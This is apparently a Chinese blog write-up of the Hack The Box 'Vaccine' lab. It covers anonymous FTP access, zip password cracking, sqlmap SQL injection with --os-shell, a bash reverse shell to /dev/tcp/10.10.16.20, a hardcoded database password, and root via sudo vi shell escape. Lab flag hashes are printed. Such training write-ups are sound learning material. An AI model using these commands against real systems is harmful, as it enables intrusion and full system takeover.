---
title: 记模拟渗透-HTB-Tier2-3
published: 2022-03-28
description: "Hack The Box Tier2-3 Writeup."
# image: "./cover.webp"
tags: ["网络安全","Hack The Box", "靶场"]
category: 网络安全
draft: false
---

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648349502777-dc37637f-1a92-4e29-8ba7-a67659a32d18.png#averageHue=%23242935&clientId=u81238e20-5254-4&from=paste&height=220&id=u6cb6276e&originHeight=220&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96326&status=done&style=none&taskId=u682586f5-a63e-4558-8aef-794eac43fd4&title=&width=865)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648349648380-2d5fe418-71d3-4bca-a47d-0d5b113325fd.png#averageHue=%232c323d&clientId=u81238e20-5254-4&from=paste&height=760&id=u61f5333a&originHeight=760&originWidth=1051&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57007&status=done&style=none&taskId=ua5bcbbff-06a8-4388-be48-d6ed4b2807b&title=&width=1051)

尝试注入。。失败<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648349701647-ba2533b9-b696-4791-8462-00ba0c742acd.png#averageHue=%232b324a&clientId=u81238e20-5254-4&from=paste&height=404&id=u9d0d62b6&originHeight=404&originWidth=563&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15998&status=done&style=none&taskId=u779d93b5-9aaa-4ae8-9787-35289928af8&title=&width=563)

发现网页没啥有用的<br />看看21端口开放的ftp

连接成功，账号Anonymous，密码为空<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648349932884-cfa6f868-ad29-432e-b865-6a087890f0d9.png#averageHue=%2322252f&clientId=u81238e20-5254-4&from=paste&height=344&id=u791cabca&originHeight=344&originWidth=771&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92569&status=done&style=none&taskId=u7a36d89c-33af-49cc-bced-3ff4f91c3a4&title=&width=771)<br />发现文件：backup.zip<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648350198582-9aed56a0-bb3c-467b-b75f-7b75fe7aced5.png#averageHue=%23242933&clientId=u81238e20-5254-4&from=paste&height=141&id=ud996191c&originHeight=141&originWidth=866&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67690&status=done&style=none&taskId=ua17ca92e-9eac-46f2-9b9c-a590ea3db9e&title=&width=866)

使用kali自带的zip2john 爆破密码<br />得到密码：741852963        (backup.zip)  <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648350435796-7367a470-5ac9-4cc7-ab8c-092117c13047.png#averageHue=%23232732&clientId=u81238e20-5254-4&from=paste&height=698&id=u42363cfb&originHeight=698&originWidth=872&originalType=binary&ratio=1&rotation=0&showTitle=false&size=326359&status=done&style=none&taskId=ub2f2ed7f-ddf6-49a3-a648-89e4c40971c&title=&width=872)<br />unzip 文件名 解压<br />用密码解压后，得到两个文件(index.php、Style.css)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648350773519-812b0d17-d979-4343-9997-3cb1cc803392.png#averageHue=%23242935&clientId=u81238e20-5254-4&from=paste&height=123&id=udd76d305&originHeight=123&originWidth=304&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19174&status=done&style=none&taskId=u2022809e-c319-422c-82bc-31e97c43780&title=&width=304)

在index.php里发现这样一行代码<br />``<?php<br />session_start();<br />  if(isset($_POST['username']) && isset($_POST['password'])) {<br />    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {<br />      $_SESSION['login'] = "true";<br />      header("Location: dashboard.php");<br />    }<br />  }<br />?><br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648351104897-d422d025-f716-4c65-9df2-0877a7b32abb.png#averageHue=%23242732&clientId=u81238e20-5254-4&from=paste&height=803&id=uf2a1be80&originHeight=803&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143027&status=done&style=none&taskId=u7c93b0bd-e1dd-4beb-beff-3d5b097e09e&title=&width=685)


用MD5加密的值是 qwerty789<br />同时发现网站的登录地址是 ：dashboard.php

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648351862075-0a8e5af6-1f12-434d-8948-56d7192b8071.png#averageHue=%232b3248&clientId=u81238e20-5254-4&from=paste&height=394&id=u021bd7b3&originHeight=394&originWidth=643&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16501&status=done&style=none&taskId=ub35ea2e3-d429-40a8-9d92-cdf962f84f5&title=&width=643)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648352208095-f2cdcf07-6de8-4b1f-aa4d-d253765a3331.png#averageHue=%23dac3a8&clientId=u81238e20-5254-4&from=paste&height=706&id=u33a2c9b1&originHeight=706&originWidth=1172&originalType=binary&ratio=1&rotation=0&showTitle=false&size=232219&status=done&style=none&taskId=udc30daae-d560-4f9e-b439-ff61a7ce831&title=&width=1172)<br />发现此处报错，证明有sql注入<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648352222993-7d56ca47-00b2-4f93-8249-3bb9f1753529.png#averageHue=%23dee7df&clientId=u81238e20-5254-4&from=paste&height=406&id=u1ef25ae2&originHeight=406&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=334955&status=done&style=none&taskId=u8abd71d9-6e68-4a9a-901f-5feb60368bf&title=&width=1206)

尝试sqlmap注入：<br />sqlmap -u http://10.129.147.44/dashboard.php?search=1 --cookie PHPSESSID=5a28uftk57hrg3vrunr3cis8cs --batch --os-shell 

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648352903650-c2780da8-524b-415f-9b36-eb2ae5ca5362.png#averageHue=%232f343f&clientId=u81238e20-5254-4&from=paste&height=602&id=u5a998809&originHeight=602&originWidth=872&originalType=binary&ratio=1&rotation=0&showTitle=false&size=208872&status=done&style=none&taskId=u9d98c9d8-cb17-41fe-9bcf-2370a891bc7&title=&width=872)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648352921800-4e839675-9747-4ea3-a9db-9549f94929a8.png#averageHue=%232f333e&clientId=u81238e20-5254-4&from=paste&height=791&id=u99de8ace&originHeight=791&originWidth=876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=289163&status=done&style=none&taskId=u842cb2c6-eb38-412b-9ce0-050db9cc39c&title=&width=876)

获得的shell是非交互式，要在此利用反弹shell，以获得交互式shell<br />bash -c "bash -i >& /dev/tcp/10.10.16.20/12123 0>&1"<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648353281405-6c11b75d-f546-47e8-a680-a29e4495c916.png#averageHue=%23282c37&clientId=u81238e20-5254-4&from=paste&height=84&id=ue8d8532b&originHeight=84&originWidth=852&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18330&status=done&style=none&taskId=ud6e714f1-9b3e-485f-bb31-f97cf3a3141&title=&width=852)

监听端口12123<br />拿到shell<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648353246916-2b7575db-aa15-4b12-9714-e1c074e8724d.png#clientId=u81238e20-5254-4&from=paste&height=278&id=u4074974b&originHeight=278&originWidth=867&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97666&status=done&style=none&taskId=u981f8bca-c4c9-4227-9fe6-0cc9d7492ac&title=&width=867)

postgres@vaccine:/var/lib/postgresql$ ls<br />ls<br />11<br />user.txt<br />postgres@vaccine:/var/lib/postgresql$ cat user.txt<br />cat user.txt<br />ec9b13ca4d6229cd5cc1e09980965bf7


在www目录发现dashboard.php里看到这样信息<br />try {<br />          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");<br />        }

有了密码，尝试ssh连接<br />ssh postgres@10.129.147.44

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648353910267-e6972844-8f1f-4b9a-b4c6-338666bc5ea0.png#clientId=u81238e20-5254-4&from=paste&height=641&id=u8c5f4e70&originHeight=641&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=255471&status=done&style=none&taskId=uee483655-0225-47f0-b6d7-64a8462bf62&title=&width=726)

这里再次发现user.txt<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648353936020-0412d55b-7c4e-489b-ba42-96d1dedcf521.png#clientId=u81238e20-5254-4&from=paste&height=111&id=udf8f1943&originHeight=111&originWidth=312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11912&status=done&style=none&taskId=uf7f09839-28a8-4e35-8b89-147e9efaece&title=&width=312)<br />postgres@vaccine:~$ ls<br />11  user.txt<br />~~postgres@vaccine:~$ cat user.txt~~<br />~~ec9b13ca4d6229cd5cc1e09980965bf7~~

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648354382993-a8ba164d-ce43-4f26-ba95-6639a9accc8f.png#clientId=u81238e20-5254-4&from=paste&height=749&id=u642f4227&originHeight=749&originWidth=695&originalType=binary&ratio=1&rotation=0&showTitle=false&size=288100&status=done&style=none&taskId=u00769d46-cd24-4472-80c5-c9912ec3729&title=&width=695)

这里是使用vi编辑器提权，vi里可以直接输入命令，因为这个vi是sudo打开，调出的shell也就是root身份。<br /> <br />命令：sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf<br />密码：P@s5w0rd!<br /> <br />在vi编辑界面里，输入:!/bin/bash

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648354754800-411a4d24-b95d-4586-a8c1-9af3a5f35afe.png#clientId=u81238e20-5254-4&from=paste&height=854&id=u3c2d91ec&originHeight=854&originWidth=714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=338924&status=done&style=none&taskId=udbedc9e0-cea0-46be-9f74-b0dcb1c397b&title=&width=714)

提权成功<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648354783716-3da01f53-adb2-42a2-855f-01fc24a3fc03.png#clientId=u81238e20-5254-4&from=paste&height=465&id=u8c2e8e1a&originHeight=465&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143544&status=done&style=none&taskId=u3ac40e3d-0c71-4915-9e64-ba5c7ae1ab7&title=&width=666)

=================================================================

后续内容不公开<br />原因-含有flag

在根目录发现root.txt<br />root@vaccine:~# ls<br />pg_hba.conf  root.txt  snap<br />root@vaccine:~# cat root<br />cat: root: No such file or directory<br />~~root@vaccine:~# cat root.txt~~<br />~~dd6e058e814260bc70e9bbdef2715849~~<br />至此拿到flag<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648354844536-c19744c4-f872-413e-815c-fe1aafe95dd1.png#clientId=u81238e20-5254-4&from=paste&height=227&id=u2d9577d5&originHeight=227&originWidth=891&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60480&status=done&style=none&taskId=ueb35b3fb-6bd4-47fd-aa83-2d0759cf807&title=&width=891)
